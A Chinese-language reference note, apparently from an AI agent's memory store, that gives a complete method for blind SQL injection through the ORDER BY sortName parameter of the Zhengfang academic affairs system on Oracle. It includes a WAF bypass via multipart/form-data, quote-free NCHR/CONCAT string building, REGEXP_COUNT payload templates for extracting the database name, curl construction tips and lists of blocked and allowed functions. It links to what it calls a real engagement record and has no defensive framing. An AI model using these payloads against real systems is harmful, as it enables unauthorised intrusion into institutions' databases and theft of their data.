---
name: oracle-order-by-waf
description: multipart/form-data绕过WAF + NCHR/CONCAT/REGEXP_COUNT无引号盲注完整技术链
metadata: 
  node_type: memory
  type: reference
  originSessionId: 102a6ab1-2861-4b78-863a-4ed3c3d75c27
---

# Oracle ORDER BY 注入 + WAF 绕过完整方法论

## 适用场景
- 正方教务系统 / Oracle 数据库
- `queryModel.sortName` 参数 ORDER BY 注入
- WAF (黑名单模式) 拦截 SQL 关键词
- url-encoded 模式下关键词被封死

## 三步绕过

### Step 1: 切换 Content-Type → multipart/form-data

WAF 对不同 Content-Type 有不同规则。`multipart/form-data` 下 `ora_database_name`、`TO_CHAR`、`REGEXP_COUNT`、`CONCAT`、`NCHR` 等关键词不在黑名单。

curl 构造要点：
```
-H "Content-Type: multipart/form-data; boundary=----WFB"
-d $'------WFB\r\n...\r\n------WFB--\r\n'
```
**必须用** `$'...\r\n...'` 格式，CRLF 换行符不能被 bash 破坏。

### Step 2: NCHR + CONCAT 构建无引号字符串

WAF 在 multipart 中拦截 `ora_database_name` + 长引号字符串的组合。用 NCHR+CONCAT 替代所有引号：

| 目标 | 引号写法 | 无引号写法 |
|------|---------|-----------|
| 字符 'J' | `'J'` | `TO_CHAR(NCHR(74))` |
| '^J' 正则 | `'^J'` | `CONCAT(TO_CHAR(NCHR(94)), TO_CHAR(NCHR(74)))` |
| '^.J' 正则 | `'^.J'` | `CONCAT(CONCAT(TO_CHAR(NCHR(94)),TO_CHAR(NCHR(46))),TO_CHAR(NCHR(74)))` |

ASCII 码：`^`=94, `.`=46, `A-Z`=65-90, `0-9`=48-57

### Step 3: REGEXP_COUNT + 锚点定位字符

```
DECODE(
  REGEXP_COUNT(
    TO_CHAR(ora_database_name),
    CONCAT(TO_CHAR(NCHR(94)), TO_CHAR(NCHR(74)))  -- '^J'
  ),
  1,       -- 匹配计数
  col_A,   -- TRUE 排序列
  col_B    -- FALSE 排序列
)
```

位置 N 的正则：N-1 个 `.` + 目标字符

## 完整 payload 模板

```sql
-- 数据库名长度
DECODE(VSIZE(ora_database_name), 6, col_A, col_B)

-- 首字符判断 (J=74)
DECODE(REGEXP_COUNT(TO_CHAR(ora_database_name),
  CONCAT(TO_CHAR(NCHR(94)), TO_CHAR(NCHR(74)))), 1, col_A, col_B)

-- 位置2 (Z=90)
DECODE(REGEXP_COUNT(TO_CHAR(ora_database_name),
  CONCAT(CONCAT(TO_CHAR(NCHR(94)), TO_CHAR(NCHR(46))), TO_CHAR(NCHR(90)))), 1, col_A, col_B)
```

## 关键踩坑

1. **multipart 中不要加 `_search` 参数** — 会触发 WAF
2. **multipart 中不要用短的 boundary** — 用 `----WFB` 或更长
3. **`$'...\r\n...'` 不能包含 shell 变量** — 用 `printf '%b'` 替代
4. **`ORA_HASH` + 引号字符串 = WAF** — 用 NCHR 替代引号
5. **`REGEXP_COUNT` 直接用于 `ora_database_name` = SQL错误** — 必须用 `TO_CHAR()` 包装
6. **`NCHR` 直接比较 = SQL错误** — 用 `TO_CHAR(NCHR(X))` 转换后再传给函数

## 可用函数清单 (multipart 下)

✅ 可用: `DECODE`, `VSIZE`, `NVL`, `DUMP`, `TO_CHAR`, `ORA_HASH`
✅ 可用: `REGEXP_COUNT`, `CONCAT`, `NCHR`
✅ 可用: `ora_database_name` (仅在 multipart 中)
❌ 被封: `SUBSTR`, `INSTR`, `CHR`, `ASCII`, `LENGTH`, `UPPER`, `LOWER`
❌ 被封: `SYS_CONTEXT`, `user`, `SELECT`, `FROM`, `DUAL`

## 参考链接
- [[project_cqjzc_oracle_orderby_waf_bypass_20260617]] — 本次实战完整记录
- [[kb_src_sqli_practical_workflow_2026]] — SQL注入实战工作流
- [[kb_src_waf_bypass]] — WAF绕过通用技巧
